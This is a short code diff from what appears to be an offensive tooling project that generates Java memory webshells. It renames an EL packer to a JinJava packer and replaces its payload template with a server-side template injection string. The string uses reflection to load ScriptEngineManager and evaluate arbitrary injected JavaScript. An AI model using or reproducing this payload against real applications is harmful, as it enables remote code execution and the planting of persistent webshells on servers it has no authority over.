@@ -1,4 +1,4 @@
-package com.reajason.javaweb.memshell.packer.el;
+package com.reajason.javaweb.memshell.packer.jinjava;
 
 import com.reajason.javaweb.memshell.config.GenerateResult;
 import com.reajason.javaweb.memshell.packer.Packer;
@@ -6,10 +6,10 @@ import com.reajason.javaweb.memshell.packer.Packers;
 
 /**
  * @author ReaJason
- * @since 2024/12/13
+ * @since 2025/1/30
  */
-public class ELPacker implements Packer {
-    String template = "''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('{{script}}')";
+public class JinJavaPacker implements Packer {
+    String template = "{{ ''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval(''.getClass().forName('java.io.StringReader').getConstructors()[0].newInstance('{{script}}')) }}";
 
     @Override
     public String pack(GenerateResult generateResult) {
